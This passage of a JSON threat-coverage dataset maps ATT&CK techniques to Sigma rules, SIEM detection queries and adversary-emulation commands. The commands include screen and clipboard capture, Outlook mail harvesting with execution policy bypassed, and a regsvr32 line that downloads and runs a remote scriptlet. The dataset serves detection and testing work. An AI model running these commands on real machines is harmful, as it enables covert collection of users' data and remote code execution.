Image.keyword:(*\\\\\\\\svchost.exe) AND ImageLoaded:(\"C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\*\"))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Svchost-DLL-Search-Order-Hijack <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Svchost DLL Search Order Hijack\",\\n    \"description\": \"IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \\\\\"svchost.exe -k netsvcs\\\\\" to gain code execution on a remote machine.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\",\\n      \"attack.t1038\",\\n      \"attack.t1112\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe) AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\tsmsisrv.dll OR *\\\\\\\\\\\\\\\\tsvipsrv.dll OR *\\\\\\\\\\\\\\\\wlbsctrl.dll)) AND (NOT (EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe) AND ImageLoaded:(\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\*\\\\\"))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe) AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\tsmsisrv.dll OR *\\\\\\\\\\\\\\\\tsvipsrv.dll OR *\\\\\\\\\\\\\\\\wlbsctrl.dll)) AND (NOT (EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe) AND ImageLoaded:(\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\*\\\\\"))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Svchost DLL Search Order Hijack\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"7\" AND Image.keyword:(*\\\\\\\\svchost.exe) AND ImageLoaded.keyword:(*\\\\\\\\tsmsisrv.dll *\\\\\\\\tsvipsrv.dll *\\\\\\\\wlbsctrl.dll)) AND (NOT (EventID:\"7\" AND Image.keyword:(*\\\\\\\\svchost.exe) AND ImageLoaded:(\"C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\*\"))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"7\" (Image=\"*\\\\\\\\svchost.exe\") (ImageLoaded=\"*\\\\\\\\tsmsisrv.dll\" OR ImageLoaded=\"*\\\\\\\\tsvipsrv.dll\" OR ImageLoaded=\"*\\\\\\\\wlbsctrl.dll\")) NOT (EventID=\"7\" (Image=\"*\\\\\\\\svchost.exe\") (ImageLoaded=\"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"7\" Image IN [\"*\\\\\\\\svchost.exe\"] ImageLoaded IN [\"*\\\\\\\\tsmsisrv.dll\", \"*\\\\\\\\tsvipsrv.dll\", \"*\\\\\\\\wlbsctrl.dll\"])  -(event_id=\"7\" Image IN [\"*\\\\\\\\svchost.exe\"] ImageLoaded IN [\"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\svchost\\\\.exe))(?=.*(?:.*.*\\\\tsmsisrv\\\\.dll|.*.*\\\\tsvipsrv\\\\.dll|.*.*\\\\wlbsctrl\\\\.dll))))(?=.*(?!.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\svchost\\\\.exe))(?=.*(?:.*C:\\\\Windows\\\\WinSxS\\\\.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Ursnif\nid: 21f17060-b282-4249-ade0-589ea3591558\nstatus: experimental\ndescription: Detects new registry key created by Ursnif malware.\nreferences:\n    - https://blog.yoroi.company/research/ursnif-long-live-the-steganography/\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\ntags:\n    - attack.execution\n    - attack.t1112\nauthor: megan201296\ndate: 2019/02/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: '*\\Software\\AppDataLow\\Software\\Microsoft\\\\*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Ursnif\nid: 21f17060-b282-4249-ade0-589ea3591558\nstatus: experimental\ndescription: Detects new registry key created by Ursnif malware.\nreferences:\n    - https://blog.yoroi.company/research/ursnif-long-live-the-steganography/\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\ntags:\n    - attack.execution\n    - attack.t1112\nauthor: megan201296\ndate: 2019/02/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: '*\\Software\\AppDataLow\\Software\\Microsoft\\\\*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\Software\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Ursnif <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Ursnif\",\\n    \"description\": \"Detects new registry key created by Ursnif malware.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1112\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Software\\\\\\\\\\\\\\\\AppDataLow\\\\\\\\\\\\\\\\Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Software\\\\\\\\\\\\\\\\AppDataLow\\\\\\\\\\\\\\\\Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Ursnif\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\Software\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" TargetObject=\"*\\\\\\\\Software\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject=\"*\\\\\\\\Software\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*.*\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1113/T1113.yaml", "command": "screencapture", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "screencapture -x", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "xwd -root -out desktop.xwd\nxwud -in desktop.xwd\n", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "import -window root", "name": null}, {"source": "data/abilities/collection/316251ed-6a28-4013-812b-ddf5b5b007f8.yml", "command": {"windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}, "darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}}, "name": "capture the contents of the screen"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot_mss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot_mss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screenshot", "name": "Empire Module Command"}], "command_list": ["screencapture", "screencapture -x", "xwd -root -out desktop.xwd\nxwud -in desktop.xwd\n", "import -window root", {"windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}, "darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}}, "powershell/collection/screenshot", "powershell/collection/screenshot", "python/collection/osx/native_screenshot", "python/collection/osx/native_screenshot", "python/collection/osx/native_screenshot_mss", "python/collection/osx/native_screenshot_mss", "python/collection/osx/screenshot", "python/collection/osx/screenshot"], "technique_id": "T1113", "parsed_datasets": [{"Atomic Red Team Test - Screen Capture": {"display_name": "Screen Capture", "atomic_tests": [{"description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "name": "Screencapture", "input_arguments": {"output_file": {"default": "desktop.png", "type": "Path", "description": "Output file path"}}, "executor": {"elevation_required": false, "command": "screencapture", "name": "bash"}}, {"description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "name": "Screencapture (silent)", "input_arguments": {"output_file": {"default": "desktop.png", "type": "Path", "description": "Output file path"}}, "executor": {"elevation_required": false, "command": "screencapture -x", "name": "bash"}}, {"description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "supported_platforms": ["linux"], "name": "X Windows Capture", "input_arguments": {"output_file": {"default": "desktop.xwd", "type": "Path", "description": "Output file path"}}, "executor": {"command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "name": "bash"}}, {"description": "Use import command to collect a full desktop screenshot\n", "supported_platforms": ["linux"], "name": "Import", "input_arguments": {"output_file": {"default": "desktop.png", "type": "Path", "description": "Output file path"}}, "executor": {"command": "import -window root", "name": "bash"}}], "attack_technique": "T1113"}}, {"Mitre Stockpile - capture the contents of the screen": {"platforms": {"windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}, "darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}}, "description": "capture the contents of the screen", "tactic": "collection", "technique": {"attack_id": "T1113", "name": "Screen Capture"}, "id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "name": "Screen Capture"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1113", "Empire Module": "powershell/collection/screenshot", "Technique": "Screen Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/screenshot\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1113", "Empire Module": "python/collection/osx/native_screenshot", "Technique": "Screen Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/native_screenshot\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1113", "Empire Module": "python/collection/osx/native_screenshot_mss", "Technique": "Screen Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/native_screenshot_mss\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1113", "Empire Module": "python/collection/osx/screenshot", "Technique": "Screen Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/screenshot\":  [\"T1113\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1114/T1114.yaml", "command": "powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file $home\\desktop\\mail.csv\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/disable_security", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/disable_security", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_emailitems", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_emailitems", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_subfolders", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_subfolders", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/mail_search", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/mail_search", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/search_gal", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/search_gal", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/send_mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/send_mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/view_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/view_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/search_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/search_email", "name": "Empire Module Command"}], "command_list": ["powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file $home\\desktop\\mail.csv\n", "powershell/management/mailraider/disable_security", "powershell/management/mailraider/disable_security", "powershell/management/mailraider/get_emailitems", "powershell/management/mailraider/get_emailitems", "powershell/management/mailraider/get_subfolders", "powershell/management/mailraider/get_subfolders", "powershell/management/mailraider/mail_search", "powershell/management/mailraider/mail_search", "powershell/management/mailraider/search_gal", "powershell/management/mailraider/search_gal", "powershell/management/mailraider/send_mail", "powershell/management/mailraider/send_mail", "powershell/management/mailraider/view_email", "powershell/management/mailraider/view_email", "python/collection/osx/search_email", "python/collection/osx/search_email"], "technique_id": "T1114", "parsed_datasets": [{"Atomic Red Team Test - Email Collection": {"display_name": "Email Collection", "attack_link": "https://attack.mitre.org/wiki/Technique/T1114", "atomic_tests": [{"description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\n", "supported_platforms": ["windows"], "name": "T1114 Email Collection with PowerShell", "input_arguments": {"output_file": {"default": "$home\\desktop\\mail.csv", "type": "String", "description": "Output file path"}}, "executor": {"elevation_required": false, "command": "powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file #{output_file}\n", "name": "command_prompt", "cleanup_command": "del #{output_file} >nul 2>&1\n"}}], "attack_technique": "T1114"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/disable_security", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/disable_security\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/get_emailitems", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/get_emailitems\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/get_subfolders", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/get_subfolders\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/mail_search", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/mail_search\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/search_gal", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/search_gal\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/send_mail", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/send_mail\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "powershell/management/mailraider/view_email", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/view_email\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1114", "Empire Module": "python/collection/osx/search_email", "Technique": "Email Collection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/search_email\":  [\"T1114\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1115/T1115.yaml", "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "name": null}, {"source": "atomics/T1115/T1115.yaml", "command": "echo Get-Process | clip\niex Get-Clipboard\n", "name": null}, {"source": "data/abilities/collection/b007fe0c-c6b0-4fda-915c-255bbc070de2.yml", "command": {"windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "darwin": {"sh": {"command": "pbpaste\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "name": "copy the contents for the clipboard and print them"}, {"source": "Threat Hunting Tables", "command": "cmd.exe <command> | clip", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe clip < readme.txt", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe echo Get-Process | clip", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe echo Get-Process | clip", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/clipboard_monitor", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/clipboard_monitor", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/clipboard", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/clipboard", "name": "Empire Module Command"}], "command_list": ["dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "echo Get-Process | clip\niex Get-Clipboard\n", {"windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "darwin": {"sh": {"command": "pbpaste\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "cmd.exe <command> | clip", "cmd.exe clip < readme.txt", "powershell.exe echo Get-Process | clip", "powershell.exe echo Get-Process | clip", "powershell/collection/clipboard_monitor", "powershell/collection/clipboard_monitor", "python/collection/osx/clipboard", "python/collection/osx/clipboard"], "technique_id": "T1115", "parsed_datasets": [{"Atomic Red Team Test - Clipboard Data": {"display_name": "Clipboard Data", "attack_link": "https://attack.mitre.org/wiki/Technique/T1115", "atomic_tests": [{"description": "Add data to clipboard to copy off or execute commands from.\n", "supported_platforms": ["windows"], "name": "Utilize Clipboard to store or execute commands from", "executor": {"elevation_required": false, "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "name": "command_prompt", "cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n"}}, {"description": "Utilize PowerShell to echo a command to clipboard and execute it\n", "supported_platforms": ["windows"], "name": "PowerShell", "executor": {"elevation_required": false, "command": "echo Get-Process | clip\niex Get-Clipboard\n", "name": "powershell"}}], "attack_technique": "T1115"}}, {"Mitre Stockpile - copy the contents for the clipboard and print them": {"platforms": {"windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "darwin": {"sh": {"command": "pbpaste\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "description": "copy the contents for the clipboard and print them", "tactic": "collection", "technique": {"attack_id": "T1115", "name": "Clipboard Data"}, "id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "name": "Copy Clipboard"}}, {"Threat Hunting Tables": {"mitre_attack": "T1115", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100128", "registry_value": "", "mitre_caption": "clipboard_data", "registry_path": "", "frequency": "rare", "commandline_string": "<command> | clip", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1115", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100129", "registry_value": "", "mitre_caption": "clipboard_data", "registry_path": "", "frequency": "rare", "commandline_string": "clip < readme.txt", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1115", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "", "chain_id": "100130", "registry_value": "", "mitre_caption": "clipboard_data", "registry_path": "", "frequency": "low", "commandline_string": "echo Get-Process | clip", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1115", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "", "chain_id": "100131", "registry_value": "", "mitre_caption": "clipboard_data", "registry_path": "", "frequency": "low", "commandline_string": "echo Get-Process | clip", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1115", "Empire Module": "powershell/collection/clipboard_monitor", "Technique": "Clipboard Data", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/clipboard_monitor\":  [\"T1115\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1115", "Empire Module": "python/collection/osx/clipboard", "Technique": "Clipboard Data", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/clipboard\":  [\"T1115\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"clip.exe\"or process_command_line contains \"*Get-Clipboard*\")", "product": "Azure Sentinel", "name": "Clipboard Data"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1117/T1117.yaml", "command": "regsvr32.exe /s /u /i:PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct scrobj.dll\n", "name": null}, {"source": "atomics/T1117/T1117.yaml", "command": "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll\n", "name": null}, {"source": "atomics/T1117/T1117.yaml", "command": "\"IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" 